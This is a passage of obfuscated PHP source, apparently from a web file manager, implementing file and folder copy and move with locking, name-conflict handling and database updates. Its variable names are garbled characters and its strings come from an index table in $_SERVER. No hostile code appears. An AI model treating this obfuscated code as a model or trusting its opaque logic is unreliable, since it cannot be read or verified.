$this->_lockKey($ú‚†Ò‹Ş, $ šğÑùÚ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Ç¤‡É Ê, $ÄØ•ë¿• = 1) { $Á­Å®Ø¿ = $_SERVER[É¨™èà][643] . md5($Ç¤‡É Ê); if ($ÄØ•ë¿•) { if (isset(self::$_lockItemArr[$Á­Å®Ø¿])) { return; } self::$_lockItemArr[$Á­Å®Ø¿] = 1; CacheLock::lock($Á­Å®Ø¿, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Á­Å®Ø¿])) { return; } unset(self::$_lockItemArr[$Á­Å®Ø¿]); CacheLock::unlock($Á­Å®Ø¿); } } public function isParentOf($æîğ­Ã¾, $ßí¿œÔä) { $‰ÅËÆÎº =& $_SERVER[É¨™èà]; $…ØÈüäœ = $this->sourceInfo($æîğ­Ã¾); $ …š¼½ = $this->sourceInfo($ßí¿œÔä); $¨Ä®í÷ = $…ØÈüäœ[$‰ÅËÆÎº[596]] . $…ØÈüäœ[$‰ÅËÆÎº[194]] . $‰ÅËÆÎº[50]; $ñ„îÆ½‚ = $ …š¼½[$‰ÅËÆÎº[596]] . $ …š¼½[$‰ÅËÆÎº[194]] . $‰ÅËÆÎº[50]; $’˜³›ï = strpos($ñ„îÆ½‚, $¨Ä®í÷) === 0; return $’˜³›ï; } private $targetIsDelete = 0; public function copy($ğ”Œç‡¶, $ÌÚ…Úè¡, $ÁÒáŠœ‚ = REPEAT_REPLACE, $…—úÊëÂ = '') { $µ‚ñò™ =& $_SERVER[É¨™èà]; $İÄ‚’¼ = $this->sourceInfo($ğ”Œç‡¶); $‚÷Ö¬«Ï = $this->sourceInfo($ÌÚ…Úè¡); if (!$İÄ‚’¼ || !$‚÷Ö¬«Ï || $‚÷Ö¬«Ï[$µ‚ñò™[495]] != $µ‚ñò™[91]) { return !1; } if ($this->isParentOf($ğ”Œç‡¶, $ÌÚ…Úè¡)) { return !1; } $Êçî¢Ò = $…—úÊëÂ ? $…—úÊëÂ : $İÄ‚’¼[$µ‚ñò™[32]]; $this->lockCopyStart($ğ”Œç‡¶); $this->lockWriteStart($ÌÚ…Úè¡, $Êçî¢Ò); $ĞÎÑ¿¸¡ = array($µ‚ñò™[644] => array(), $µ‚ñò™[645] => array(), $µ‚ñò™[646] => array()); $this->targetIsDelete = intval($İÄ‚’¼[$µ‚ñò™[515]]); $Ğ¿½Œî¨ = $this->fileNameExistAuto($ÌÚ…Úè¡, $İÄ‚’¼); $Çİåğ = $this->_copy($ğ”Œç‡¶, $ÌÚ…Úè¡, $ÁÒáŠœ‚, $ĞÎÑ¿¸¡, !0, $…—úÊëÂ); $this->_childrenListClear(); $this->lockCopyEnd($ğ”Œç‡¶); $this->lockWriteEnd($ÌÚ…Úè¡, $Êçî¢Ò); if ($İÄ‚’¼[$µ‚ñò™[495]] == $µ‚ñò™[91] && $Ğ¿½Œî¨ == $Çİåğ) { $this->folderSizeResetChildren($Ğ¿½Œî¨); } Model($µ‚ñò™[647])->addAll($ĞÎÑ¿¸¡[$µ‚ñò™[645]], array(), !0); if ($Ğ¿½Œî¨ != $Çİåğ || $İÄ‚’¼[$µ‚ñò™[495]] == $µ‚ñò™[91]) { Model($µ‚ñò™[648])->eventCopy($Çİåğ); } $this->saveAll($ĞÎÑ¿¸¡[$µ‚ñò™[646]]); Model($µ‚ñò™[233])->linkAdd($ĞÎÑ¿¸¡[$µ‚ñò™[644]]); $this->folderSizeReset($ÌÚ…Úè¡); $this->updateModifyTime($ÌÚ…Úè¡); return $Çİåğ; } private function _copy($À€½êÊ, $œ‰”Ôá¬, $Ö™ŸĞŸ, &$Úç°õèå, $óü“ˆùÙ, $«èëŒı = '') { $„Ê»à§® =& $_SERVER[É¨™èà]; $Ñ·ƒœÚÙ = $this->sourceInfoCache($À€½êÊ); $¿Ú­¬ˆÇ = $Ñ·ƒœÚÙ[$„Ê»à§®[495]] == $„Ê»à§®[91]; $®Æ¸üºæ = $«èëŒı ? $«èëŒı : $Ñ·ƒœÚÙ[$„Ê»à§®[32]]; $¸îğõŞ = $this->fileNameExistAuto($œ‰”Ôá¬, $Ñ·ƒœÚÙ); if ($óü“ˆùÙ) { $this->_childrenAllMake($À€½êÊ); if ($¿Ú­¬ˆÇ && $¸îğõŞ) { $this->_childrenAllMake($¸îğõŞ); } } if (!$¸îğõŞ) { return $this->_copyCreate($À€½êÊ, $œ‰”Ôá¬, $®Æ¸üºæ, $Úç°õèå); } $†óïò¹ = $¸îğõŞ; if ($¿Ú­¬ˆÇ) { if ($Ö™ŸĞŸ == REPEAT_RENAME_FOLDER) { $®Æ¸üºæ = $this->fileNameAutoCache($œ‰”Ôá¬, $®Æ¸üºæ, $Ö™ŸĞŸ, $¿Ú­¬ˆÇ); $†óïò¹ = $this->_copyCreate($À€½êÊ, $œ‰”Ôá¬, $®Æ¸üºæ, $Úç°õèå); } else { $ÕóĞÀµ = $this->_childrenList($À€½êÊ); foreach ($ÕóĞÀµ as $Í³·È¼) { $this->_copy($Í³·È¼[$„Ê»à§®[194]], $¸îğõŞ, $Ö™ŸĞŸ, $Úç°õèå, !1); } } } else { if ($Ö™ŸĞŸ == REPEAT_RENAME || $Ö™ŸĞŸ == REPEAT_RENAME_FOLDER) { $®Æ¸üºæ = $this->fileNameAutoCache($œ‰”Ôá¬, $®Æ¸üºæ, $Ö™ŸĞŸ, $¿Ú­¬ˆÇ); $†óïò¹ = $this->_copyCreate($À€½êÊ, $œ‰”Ôá¬, $®Æ¸üºæ, $Úç°õèå); } else { if ($Ö™ŸĞŸ == REPEAT_REPLACE) { $‘œËÖ£— = $this->sourceInfoCache($¸îğõŞ); $á“áæî = $this->fileHistory($‘œËÖ£—, $Ñ·ƒœÚÙ[$„Ê»à§®[553]], $Ñ·ƒœÚÙ[$„Ê»à§®[79]]); if ($á“áæî) { $Úç°õèå[$„Ê»à§®[644]][] = $Ñ·ƒœÚÙ[$„Ê»à§®[553]]; } } else { if ($Ö™ŸĞŸ == REPEAT_SKIP) { } } } Hook::trigger($„Ê»à§®[649], array($„Ê»à§®[650], $Ñ·ƒœÚÙ, 0)); } return $†óïò¹; } private function _copyCreate($ÙÔ¬Ú, $ˆŒî§¦», $óä¢†î, &$ïĞš£Û) { $ˆ€µƒõé =& $_SERVER[É¨™èà]; $èãÙÏÈ = $this->sourceInfoCache($ÙÔ¬Ú); $–Î½ÌÜê = $this->sourceInfoCache($ˆŒî§¦»); $³çåÓ = $this->_makeItemData($èãÙÏÈ, $–Î½ÌÜê, $óä¢†î); Hook::trigger($ˆ€µƒõé[651], $³çåÓ); Hook::trigger($ˆ€µƒõé[652], array($ˆ€µƒõé[653], $³çåÓ, 0)); $˜Àî± = $this->add($³çåÓ); $Ò¼¡¡º = array($ˆ€µƒõé[194] => $˜Àî±, $ˆ€µƒõé[32] => $óä¢†î); $this->_copyApplyMeta($Ò¼¡¡º, $ïĞš£Û); if ($èãÙÏÈ[$ˆ€µƒõé[495]] != $ˆ€µƒõé[91]) { $ïĞš£Û[$ˆ€µƒõé[644]][] = $èãÙÏÈ[$ˆ€µƒõé[553]]; return $˜Àî±; } $«õòÛıÈ = array(); $‹ÂÌ¥ô˜ = array(); $this->_childrenListAll($ÙÔ¬Ú, $«õòÛıÈ); $±³ü™­é = count($«õòÛıÈ); if ($±³ü™­é == 0) { return $˜Àî±; } $ŠõƒÁÓç = $this->sourceInfo($˜Àî±); foreach ($«õòÛıÈ as $Æ”İª¢) { $œãıƒÊÓ = $this->_makeItemData($Æ”İª¢, $ŠõƒÁÓç, $Æ”İª¢[$ˆ€µƒõé[32]]); $œãıƒÊÓ[$ˆ€µƒõé[596]] = $Æ”İª¢[$ˆ€µƒõé[596]]; $‹ÂÌ¥ô˜[] = $œãıƒÊÓ; } $this->chunkEventSet($ˆ€µƒõé[654], array($ˆ€µƒõé[655], $³çåÓ, $±³ü™­é)); $this->addAll($‹ÂÌ¥ô˜, array(), !1); $¯şŒÓÅş = $this->where(array($ˆ€µƒõé[193] => $˜Àî±))->select(); $Òé´‚Óª = $this->_childrenMakeRelation($«õòÛıÈ, $¯şŒÓÅş); $Òé´‚Óª[$ÙÔ¬Ú] = $˜Àî±; $ËşÄ†Õ = array(); $ÀÄƒµ± = array(); foreach ($¯şŒÓÅş as $Æ”İª¢) { $ôÖ£´ƒ¸ = $Æ”İª¢[$ˆ€µƒõé[194]]; $á¿ª«Ú = $this->_childrenMatch($Òé´‚Óª, $Æ”İª¢, $ŠõƒÁÓç); $ËşÄ†Õ[] = array($ˆ€µƒõé[194], $ôÖ£´ƒ¸, $ˆ€µƒõé[193], $á¿ª«Ú[$ˆ€µƒõé[193]]); $ÀÄƒµ±[] = array($ˆ€µƒõé[194], $ôÖ£´ƒ¸, $ˆ€µƒõé[596], $á¿ª«Ú[$ˆ€µƒõé[596]]); $this->_copyApplyMeta($Æ”İª¢, $ïĞš£Û); if ($Æ”İª¢[$ˆ€µƒõé[495]] != $ˆ€µƒõé[91]) { $ïĞš£Û[$ˆ€µƒõé[644]][] = $Æ”İª¢[$ˆ€µƒõé[553]]; } } $this->chunkEventSet($ˆ€µƒõé[656], array($ˆ€µƒõé[657], $³çåÓ, $±³ü™­é)); $this->saveAll($ËşÄ†Õ); $this->chunkEventSet($ˆ€µƒõé[658], array($ˆ€µƒõé[659], $³çåÓ, $±³ü™­é)); $this->saveAll($ÀÄƒµ±); return $˜Àî±; } private function _childrenMakeRelation($ª¥Ì£ó, $Í¶£ŒæÓ) { $ŒõÔ®±£ =& $_SERVER[É¨™èà]; $Ñ•Ú‚œÖ = array(); $ÅÜÙŸ… = array(); foreach ($ª¥Ì£ó as $›î——ø©) { $àíÎÄê‚ = $›î——ø©[$ŒõÔ®±£[32]] . $ŒõÔ®±£[8] . $›î——ø©[$ŒõÔ®±£[596]]; $Ñ•Ú‚œÖ[$àíÎÄê‚] = $›î——ø©[$ŒõÔ®±£[194]]; } foreach ($Í¶£ŒæÓ as $›î——ø©) { $àíÎÄê‚ = $›î——ø©[$ŒõÔ®±£[32]] . $ŒõÔ®±£[8] . $›î——ø©[$ŒõÔ®±£[596]]; $×Ø¸ÙöÕ = $Ñ•Ú‚œÖ[$àíÎÄê‚]; $ÅÜÙŸ…[$×Ø¸ÙöÕ] = $›î——ø©[$ŒõÔ®±£[194]]; } return $ÅÜÙŸ…; } private function _childrenMatch($ğ¡ÑŞª‡, $¡•¿è¢œ, $ªöÓ„Ş¼) { $¤øÙÁƒ° =& $_SERVER[É¨™èà]; $“¯ƒÈ  = $ªöÓ„Ş¼[$¤øÙÁƒ°[596]]; $ëé“ƒô’ = $this->parentLevelArray($¡•¿è¢œ[$¤øÙÁƒ°[596]]); foreach ($ëé“ƒô’ as $°ï’êÉ—) { if (isset($ğ¡ÑŞª‡[$°ï’êÉ—])) { $“¯ƒÈ  .= $ğ¡ÑŞª‡[$°ï’êÉ—] . $¤øÙÁƒ°[660]; } } $“¯ƒÈ  = rtrim($“¯ƒÈ , $¤øÙÁƒ°[50]) . $¤øÙÁƒ°[50]; $å±ØÈÕÏ = $this->parentLevelArray($“¯ƒÈ ); $Šò—Ò·é = $å±ØÈÕÏ[count($å±ØÈÕÏ) - 1]; return array($¤øÙÁƒ°[193] => $Šò—Ò·é, $¤øÙÁƒ°[596] => $“¯ƒÈ ); } private function _makeItemData($­è‡öôÁ, $±ïÜòëá, $°ÔÍ÷›) { $¡¹ù¤œ² =& $_SERVER[É¨™èà]; $¬“Â¯Ï– = array($¡¹ù¤œ²[661] => $­è‡öôÁ[$¡¹ù¤œ²[495]], $¡¹ù¤œ²[504] => $°ÔÍ÷›, $¡¹ù¤œ²[662] => $­è‡öôÁ[$¡¹ù¤œ²[496]] ? $­è‡öôÁ[$¡¹ù¤œ²[496]] : $¡¹ù¤œ²[12], $¡¹ù¤œ²[554] => $­è‡öôÁ[$¡¹ù¤œ²[553]] ? $­è‡öôÁ[$¡¹ù¤œ²[553]] : 0, $¡¹ù¤œ²[632] => $­è‡öôÁ[$¡¹ù¤œ²[79]] ? $­è‡öôÁ[$¡¹ù¤œ²[79]] : 0, $¡¹ù¤œ²[663] => intval($±ïÜòëá[$¡¹ù¤œ²[191]]), $¡¹ù¤œ²[664] => intval($±ïÜòëá[$¡¹ù¤œ²[581]]), $¡¹ù¤œ²[665] => intval(USER_ID), $¡¹ù¤œ²[666] => intval(USER_ID), $¡¹ù¤œ²[487] => intval($±ïÜòëá[$¡¹ù¤œ²[194]]), $¡¹ù¤œ²[667] => $±ïÜòëá[$¡¹ù¤œ²[596]] . $±ïÜòëá[$¡¹ù¤œ²[194]] . $¡¹ù¤œ²[50], $¡¹ù¤œ²[508] => $­è‡öôÁ[$¡¹ù¤œ²[88]] ? $­è‡öôÁ[$¡¹ù¤œ²[88]] : time(), $¡¹ù¤œ²[514] => 0, $¡¹ù¤œ²[668] => $¡¹ù¤œ²[12]); return $¬“Â¯Ï–; } private function _copyApplyMeta($š²Æ§Ú, &$¾õÇéê) { $‡Úƒ›©ù =& $_SERVER[É¨™èà]; $’¨÷£¶Ü = $š²Æ§Ú[$‡Úƒ›©ù[194]]; $Ä…ıäÏ = $š²Æ§Ú[$‡Úƒ›©ù[32]]; if (!isset($š²Æ§Ú[$‡Úƒ›©ù[669]]) || !$š²Æ§Ú[$‡Úƒ›©ù[669]] || $š²Æ§Ú[$‡Úƒ›©ù[669]] == $‡Úƒ›©ù[231]) { $¾õÇéê[$‡Úƒ›©ù[646]][] = array($‡Úƒ›©ù[194], $’¨÷£¶Ü, $‡Úƒ›©ù[669], short_id($’¨÷£¶Ü)); } if (Input::check($Ä…ıäÏ, $‡Úƒ›©ù[670])) { $¾õÇéê[$‡Úƒ›©ù[645]][] = array($‡Úƒ›©ù[194] => $’¨÷£¶Ü, $‡Úƒ›©ù[97] => $‡Úƒ›©ù[548], $‡Úƒ›©ù[461] => str_replace($‡Úƒ›©ù[53], $‡Úƒ›©ù[12], Pinyin::get($Ä…ıäÏ))); $¾õÇéê[$‡Úƒ›©ù[645]][] = array($‡Úƒ›©ù[194] => $’¨÷£¶Ü, $‡Úƒ›©ù[97] => $‡Úƒ›©ù[547], $‡Úƒ›©ù[461] => Pinyin::get($Ä…ıäÏ, $‡Úƒ›©ù[671])); } $¾õÇéê[$‡Úƒ›©ù[645]][] = array($‡Úƒ›©ù[194] => $’¨÷£¶Ü, $‡Úƒ›©ù[97] => $‡Úƒ›©ù[527], $‡Úƒ›©ù[461] => KodSort::makeStr($Ä…ıäÏ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ÛíøÏ·¢) { $õ¡Õ ğ =& $_SERVER[É¨™èà]; $ÀÁø¼†Ğ = $this->sourceInfo($ÛíøÏ·¢); $÷èÒâ¡½ = $õ¡Õ ğ[672]; $ÈÚŒîä = array($õ¡Õ ğ[596] => array($õ¡Õ ğ[627], $ÀÁø¼†Ğ[$õ¡Õ ğ[596]] . $ÛíøÏ·¢ . $õ¡Õ ğ[628]), $õ¡Õ ğ[515] => $this->targetIsDelete); $ªîø•Í = $this->field($÷èÒâ¡½)->where($ÈÚŒîä)->select(); if (!$ªîø•Í) { return; } $ªîø•Í = array_to_keyvalue($ªîø•Í, $õ¡Õ ğ[194]); foreach ($ªîø•Í as $ÁÙ°ÙÄë) { $² ¯İ°ì = $ÁÙ°ÙÄë[$õ¡Õ ğ[193]]; $ÛíøÏ·¢ = $ÁÙ°ÙÄë[$õ¡Õ ğ[194]]; if (!isset($this->_childrenListCache[$ÛíøÏ·¢]) && $ÁÙ°ÙÄë[$õ¡Õ ğ[495]] == $õ¡Õ ğ[91]) { $this->_childrenListCache[$ÛíøÏ·¢] = array(); } if (!isset($this->_childrenListCache[$² ¯İ°ì])) { $this->_childrenListCache[$² ¯İ°ì] = array(); } $this->_childrenListCache[$² ¯İ°ì][$ÛíøÏ·¢] = $ÁÙ°ÙÄë; $this->_childrenItemCache[$ÛíøÏ·¢] = $ÁÙ°ÙÄë; } } private function _childrenListAll($†£„ÂáÈ, &$¯‹ ¢Ã¹) { $¨ºÁõ–‹ =& $_SERVER[É¨™èà]; if (!isset($this->_childrenListCache[$†£„ÂáÈ])) { return; } $Ùœ¸ Àî = $this->_childrenListCache[$†£„ÂáÈ]; foreach ($Ùœ¸ Àî as $À±õ¿  => $ä¿¢éÈ‰) { $¯‹ ¢Ã¹[$À±õ¿ ] = $ä¿¢éÈ‰; if ($ä¿¢éÈ‰[$¨ºÁõ–‹[495]] == $¨ºÁõ–‹[91]) { $this->_childrenListAll($À±õ¿ , $¯‹ ¢Ã¹); } } } private function sourceInfoCache($ ›ØÌÂ÷) { if (isset($this->_childrenItemCache[$ ›ØÌÂ÷])) { return $this->_childrenItemCache[$ ›ØÌÂ÷]; } return $this->sourceInfo($ ›ØÌÂ÷); } private function _childrenList($é´Ç­Ğ) { if (isset($this->_childrenListCache[$é´Ç­Ğ])) { return $this->_childrenListCache[$é´Ç­Ğ]; } return $this->_childrenListSelect($é´Ç­Ğ); } private function _childrenListSelect($‹ã˜’‰Ò) { $¶…º™‰± =& $_SERVER[É¨™èà]; $ĞÏÅ®É = array($¶…º™‰±[193] => $‹ã˜’‰Ò, $¶…º™‰±[515] => $this->targetIsDelete); $å¼‚ü¿ = $this->where($ĞÏÅ®É)->select(); $å¼‚ü¿ = $å¼‚ü¿ ? $å¼‚ü¿ : array(); $„“¨ÌéÑ = array_to_keyvalue($å¼‚ü¿, $¶…º™‰±[194]); $this->_childrenListCache[$‹ã˜’‰Ò] = $„“¨ÌéÑ; foreach ($„“¨ÌéÑ as $‹ã˜’‰Ò => $÷Ù îûÙ) { $this->_childrenItemCache[$‹ã˜’‰Ò] = $÷Ù îûÙ; } return $„“¨ÌéÑ; } private function fileNameExistAuto($İòï¤ÔÒ, $öõÂêâÑ) { $®æê Äæ =& $_SERVER[É¨™èà]; if ($öõÂêâÑ[$®æê Äæ[515]] == $®æê Äæ[91]) { return $this->fileNameExist($İòï¤ÔÒ, $öõÂêâÑ[$®æê Äæ[32]]); } return $this->fileNameExistCache($İòï¤ÔÒ, $öõÂêâÑ[$®æê Äæ[32]]); } private function fileNameExistCache($£’ì£ß, $ÇÉ¿™”¸) { $¤¢¬½Ş« =& $_SERVER[É¨™èà]; $ÇÉ¿™”¸ = strtolower($ÇÉ¿™”¸); $ÑÙÂßíã = $this->_childrenList($£’ì£ß); foreach ($ÑÙÂßíã as $ÚŸÎ½ğÊ) { if ($ÇÉ¿™”¸ == strtolower($ÚŸÎ½ğÊ[$¤¢¬½Ş«[32]])) { return $ÚŸÎ½ğÊ[$¤¢¬½Ş«[194]]; } } return !1; } private function fileNameAutoCache($Ÿ¡ïÚ¨é, $ßÜöÈÀ˜, $õ•Ø®ê‰, $‡›®û„æ) { $Î¡¨óë× =& $_SERVER[É¨™èà]; $‘¦•Ü„ = $this->_childrenList($Ÿ¡ïÚ¨é); $âÓ¶ö Š = array_to_keyvalue($‘¦•Ü„, $Î¡¨óë×[12], $Î¡¨óë×[32]); return $this->fileNameAutoGet($âÓ¶ö Š, $ßÜöÈÀ˜, $õ•Ø®ê‰, $‡›®û„æ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($µòĞ¨ó, $ç¶Æ§Ë, $ÀüŒ„ş— = REPEAT_REPLACE, $â÷ÜÁ° = '') { $”ŞÛ›¨Û =& $_SERVER[É¨™èà]; $’”şµÊú = $this->sourceInfo($µòĞ¨ó); $–ØÕõÕ¬ = $this->sourceInfo($ç¶Æ§Ë); if ($’”şµÊú[$”ŞÛ›¨Û[193]] == $–ØÕõÕ¬[$”ŞÛ›¨Û[194]]) { if ($’”şµÊú[$”ŞÛ›¨Û[515]] == $”ŞÛ›¨Û[91]) { Model($”ŞÛ›¨Û[513])->restore(array($µòĞ¨ó)); } if (!$â÷ÜÁ° || $â÷ÜÁ° == $’”şµÊú[$”ŞÛ›¨Û[32]]) { return $µòĞ¨ó; } } $¶¬ı§Àë = $this->pathInfoMore($µòĞ¨ó); if ($this->isParentOf($µòĞ¨ó, $ç¶Æ§Ë)) { return !1; } if (!$’”şµÊú || !$–ØÕõÕ¬ || $–ØÕõÕ¬[$”ŞÛ›¨Û[495]] != $”ŞÛ›¨Û[91]) { return !1; } Hook::trigger($”ŞÛ›¨Û[673], $¶¬ı§Àë); $this->targetIsDelete = intval($’”şµÊú[$”ŞÛ›¨Û[515]]); if ($’”şµÊú[$”ŞÛ›¨Û[193]] == $ç¶Æ§Ë && $â÷ÜÁ° != $’”şµÊú[$”ŞÛ›¨Û[32]]) { $äºûîá = $this->fileNameExist($ç¶Æ§Ë, $â÷ÜÁ°); if ($äºûîá && $’”şµÊú[$”ŞÛ›¨Û[495]] == $”ŞÛ›¨Û[231]) { $ßşìñ½‘ = $this->sourceInfo($äºûîá); $¡ø¬´€ = $this->fileHistory($ßşìñ½‘, $’”şµÊú[$”ŞÛ›¨Û[553]], $’”şµÊú[$”ŞÛ›¨Û[79]]); if (!$¡ø¬´€) { Model($”ŞÛ›¨Û[556])->remove($’”şµÊú[$”ŞÛ›¨Û[553]]); } $this->removeNow($µòĞ¨ó, !1); $this->folderSizeReset($ç¶Æ§Ë); Hook::trigger($”ŞÛ›¨Û[674], $¶¬ı§Àë); return $äºûîá; } } $í¸ùÌÅ  = $â÷ÜÁ° ? $â÷ÜÁ° : $’”şµÊú[$”ŞÛ›¨Û[32]]; $this->lockMoveStart($µòĞ¨ó); $this->lockWriteStart($ç¶Æ§Ë, $í¸ùÌÅ ); $¬å¨˜Ê = array($”ŞÛ›¨Û[644] => array(), $”ŞÛ›¨Û[675] => !1); $this->clearShare($µòĞ¨ó, $ç¶Æ§Ë); $Ò¯”¿±ï = $this->fileNameExistAuto($ç¶Æ§Ë, $’”şµÊú); $‘åÈÕÌ = $this->_move($µòĞ¨ó, $ç¶Æ§Ë, $ÀüŒ„ş—, $¬å¨˜Ê, $â÷ÜÁ°); $this->sourceCacheClear(); if ($’”şµÊú[$”ŞÛ›¨Û[495]] == $”ŞÛ›¨Û[91] && $Ò¯”¿±ï) { $this->folderSizeResetChildren($‘åÈÕÌ); } Model($”ŞÛ›¨Û[233])->linkAdd($¬å¨˜Ê[$”ŞÛ›¨Û[644]]); if ($‘åÈÕÌ && $Ò¯”¿±ï && $¬å¨˜Ê[$”ŞÛ›¨Û[675]]) { $®¹±†¬¨ = $’”şµÊú[$”ŞÛ›¨Û[495]] == $”ŞÛ›¨Û[91] ? $this->_childrenListSelect($µòĞ¨ó) : !1; $´¹Ş¶×“ = $®¹±†¬¨ && count($®¹±†¬¨) > 0 ? !0 : !1; $this->removeNow($µòĞ¨ó, $´¹Ş¶×“); } $this->lockMoveEnd($µòĞ¨ó); $this->lockWriteEnd($ç¶Æ§Ë, $í¸ùÌÅ ); $this->folderSizeReset($’”şµÊú[$”ŞÛ›¨Û[193]]); $this->folderSizeReset($ç¶Æ§Ë); $şşñ×Ôà = array($’”şµÊú[$”ŞÛ›¨Û[193]], $ç¶Æ§Ë); if ($’”şµÊú[$”ŞÛ›¨Û[495]] == $”ŞÛ›¨Û[91]) { $şşñ×Ôà[] = $µòĞ¨ó; } $this->updateModifyTime($şşñ×Ôà); Model($”ŞÛ›¨Û[648])->eventMove($µòĞ¨ó, $’”şµÊú[$”ŞÛ›¨Û[193]], $ç¶Æ§Ë); Hook::trigger($”ŞÛ›¨Û[674], $¶¬ı§Àë); return $‘åÈÕÌ; } private function _move($’Îù¢û, $§—öÈ¨¬, $†Ò²†Š, &$Ú— ´ğ, $íéïĞë = '') { $¢“´¤ò =& $_SERVER[É¨™èà]; $¤êúŠÖ· = $this->sourceInfo($’Îù¢û); $Ä®ÂéÄ› = $¤êúŠÖ·[$¢“´¤ò[495]] == $¢“´¤ò[91]; $Ï™Ö³êš = $íéïĞë ? $íéïĞë : $¤êúŠÖ·[$¢“´¤ò[32]]; $Éí™Ãœ› = $this->fileNameExistAuto($§—öÈ¨¬, $¤êúŠÖ·); $this->lockMoveStart($’Îù¢û); $this->lockWriteStart($§—öÈ¨¬, $Ï™Ö³êš); if (!$Éí™Ãœ›) { return $this->_moveForce($’Îù¢û, $§—öÈ¨¬, $Ï™Ö³êš); } $…ú’´¶³ = $Éí™Ãœ›; $ÇÄë›ö¹ = !1; if ($Ä®ÂéÄ›) { if ($†Ò²†Š == REPEAT_RENAME_FOLDER) { $Ï™Ö³êš = $this->fileNameAuto($§—öÈ¨¬, $Ï™Ö³êš, $†Ò²†Š, $Ä®ÂéÄ›); $…ú’´¶³ = $this->_moveForce($’Îù¢û, $§—öÈ¨¬, $Ï™Ö³êš); } else { $åãÙ”ñÌ = $this->_childrenListSelect($’Îù¢û); foreach ($åãÙ”ñÌ as $ù¬³ÃŠ) { $­óª‚Ñ = REPEAT_REPLACE; $this->_move($ù¬³ÃŠ[$¢“´¤ò[194]], $Éí™Ãœ›, $­óª‚Ñ, $Ú— ´ğ); } $ÇÄë›ö¹ = !0; } } else { if ($†Ò²†Š == REPEAT_RENAME || $†Ò²†Š == REPEAT_RENAME_FOLDER) { $Ï™Ö³êš = $this->fileNameAuto($§—öÈ¨¬, $Ï™Ö³êš, $†Ò²†Š, $Ä®ÂéÄ›); $…ú’´¶³ = $this->_moveForce($’Îù¢û, $§—öÈ¨¬, $Ï™Ö³êš); } else { $®•§ô—³ = $this->sourceInfoCache($Éí™Ãœ›); $ÔÀõ…¶Â = $this->fileHistory($®•§ô—³, $¤êúŠÖ·[$¢“´¤ò[553]], $¤êúŠÖ·[$¢“´¤ò[79]]); if ($ÔÀõ…¶Â) { $Ú— ´ğ[$¢“´¤ò[644]][] = $¤êúŠÖ·[$¢“´¤ò[553]]; } $ÇÄë›ö¹ = !0; } } if ($ÇÄë›ö¹) { $Ú— ´ğ[$¢“´¤ò[675]] = !0; } return $…ú’´¶³; } private function _moveForce($â¶ÔÜ¦Ñ, $Ù‡­úô·, $šã´ßÊ½) { $³Î¾ŞÌÄ =& $_SERVER[É¨™èà]; $ü¬Æ«Œ = $this->sourceInfo($â¶ÔÜ¦Ñ); $Ä¬Õ€ê˜ = $this->sourceInfo($Ù‡­úô·); $Äƒëãäß = $ü¬Æ«Œ[$³Î¾ŞÌÄ[495]] == $³Î¾ŞÌÄ[91]; $Á¯ºĞç¬ = array($³Î¾ŞÌÄ[487] => $Ä¬Õ€ê˜[$³Î¾ŞÌÄ[194]], $³Î¾ŞÌÄ[667] => $Ä¬Õ€ê˜[$³Î¾ŞÌÄ[596]] . $Ä¬Õ€ê˜[$³Î¾ŞÌÄ[194]] . $³Î¾ŞÌÄ[50], $³Î¾ŞÌÄ[663] => $Ä¬Õ€ê˜[$³Î¾ŞÌÄ[191]], $³Î¾ŞÌÄ[664] => $Ä¬Õ€ê˜[$³Î¾ŞÌÄ[581]], $³Î¾ŞÌÄ[666] => USER_ID, $³Î¾ŞÌÄ[504] => $šã´ßÊ½); $óÛá’ûê = $ü¬Æ«Œ[$³Î¾ŞÌÄ[191]] == SourceModel::TYPE_GROUP && $Ä¬Õ€ê˜[$³Î¾ŞÌÄ[191]] == SourceModel::TYPE_GROUP && $ü¬Æ«Œ[$³Î¾ŞÌÄ[581]] == $Ä¬Õ€ê˜[$³Î¾ŞÌÄ[581]]; if (!$óÛá’ûê && $this->moveClearAuth) { Model($³Î¾ŞÌÄ[579])->authClear($â¶ÔÜ¦Ñ); } $‘øıÎë = $ü¬Æ«Œ[$³Î¾ŞÌÄ[515]] == $³Î¾ŞÌÄ[91] && $Ä¬Õ€ê˜[$³Î¾ŞÌÄ[515]] != $³Î¾ŞÌÄ[91]; if ($‘øıÎë) { $Á¯ºĞç¬[$³Î¾ŞÌÄ[514]] = 0; } if ($Äƒëãäß) { $¶­âô´ô = array($³Î¾ŞÌÄ[667] => array($³Î¾ŞÌÄ[627], $ü¬Æ«Œ[$³Î¾ŞÌÄ[596]] . $ü¬Æ«Œ[$³Î¾ŞÌÄ[194]] . $³Î¾ŞÌÄ[628])); $Öşµ•Û = $ü¬Æ«Œ[$³Î¾ŞÌÄ[596]] . $ü¬Æ«Œ[$³Î¾ŞÌÄ[194]] . $³Î¾ŞÌÄ[50]; $´ëıÔƒ = $Ä¬Õ€ê˜[$³Î¾ŞÌÄ[596]] . $Ä¬Õ€ê˜[$³Î¾ŞÌÄ[194]] . $³Î¾ŞÌÄ[50] . $ü¬Æ«Œ[$³Î¾ŞÌÄ[194]] . $³Î¾ŞÌÄ[50]; $÷û«¦µÌ = array($³Î¾ŞÌÄ[667] => array($³Î¾ŞÌÄ[676], "\162\x65\x70\x6c\x61\x63\x65\x28\x70\141\162\x65\156\164\x4c\145\x76\x65\154\54\47{$Öşµ•Û}\47\x2c\x27{$´ëıÔƒ}\x27\51"), $³Î¾ŞÌÄ[663] => $Ä¬Õ€ê˜[$³Î¾ŞÌÄ[191]], $³Î¾ŞÌÄ[664] => $Ä¬Õ€ê˜[$³Î¾ŞÌÄ[581]]); if ($‘øıÎë) { $÷û«¦µÌ[$³Î¾ŞÌÄ[514]] = 0; } $this->where($¶­âô´ô)->data($÷û«¦µÌ)->save(); } $this->where(array($³Î¾ŞÌÄ[501] => $â¶ÔÜ¦Ñ))->data($Á¯ºĞç¬)->save(); return $â¶ÔÜ¦Ñ; } private function clearShare($ûı²Ä, $¤ÌŒãªÃ) { $–°€ûÌ‚ =& $_SERVER[É¨™èà]; $³Ë˜¥ä² = $this->sourceInfo($ûı²Ä); $çéŒ½Ø¾ = $this->sourceInfo($¤ÌŒãªÃ); if ($³Ë˜¥ä²[$–°€ûÌ‚[581]] == $çéŒ½Ø¾[$–°€ûÌ‚[581]] && 